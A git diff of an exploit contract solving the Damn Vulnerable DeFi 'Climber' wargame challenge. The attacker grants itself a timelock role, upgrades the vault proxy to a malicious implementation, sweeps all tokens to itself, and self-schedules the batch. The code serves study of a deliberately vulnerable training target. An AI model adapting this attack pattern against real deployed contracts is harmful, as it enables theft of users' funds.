@@ -8,7 +8,8 @@ import "./ClimberVault.sol";
 
 /**
  * @title ClimberAttacker
- * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
+ * @author your boi, 
+ * with some help from https://github.com/lior-abadi/damn-vulnerable-defi-solutions/blob/master/contracts/climber/ClimberCracker.sol
  */
 contract ClimberAttacker is AccessControl {
     using Address for address;
@@ -39,18 +40,20 @@ contract ClimberAttacker is AccessControl {
             "grantRole(bytes32,address)", PROPOSER_ROLE, address(this)
         ));
 
-        // 2) upgrade ClimberVault -> ClimberVaultPwned and initialize the latter
+        // 2) upgrade ClimberVault -> ClimberVaultPwned
+        // ##### unable to call initialize() on _vaultPwned using upgradeToAndCall(), #######
+        // ##### hence added 'address to' in sweepFunds() instead   #########################
         targets.push(vault);
         values.push(0);
         dataElements.push(abi.encodeWithSignature(
-            "upgradeToAndCall(address,bytes)", _vaultPwned, abi.encodeWithSignature('initialize(address)', msg.sender)
+            "upgradeTo(address)", _vaultPwned
         ));
 
         // 3) sweep proxy off of all DVTs using ClimberVaultPwned
         targets.push(vault);
         values.push(0);
         dataElements.push(abi.encodeWithSignature(
-            "sweepFunds(address)", _token
+            "sweepFunds(address,address)", _token, msg.sender
         ));
 
         // schedule 1, 2, 3, and this scheduling txn
@@ -60,6 +63,7 @@ contract ClimberAttacker is AccessControl {
             "scheduleAll()"
         ));
 
+        // could be anything
         salt = bytes32('xyz');
 
         ClimberTimelock(timelock).execute(targets, values, dataElements, salt);
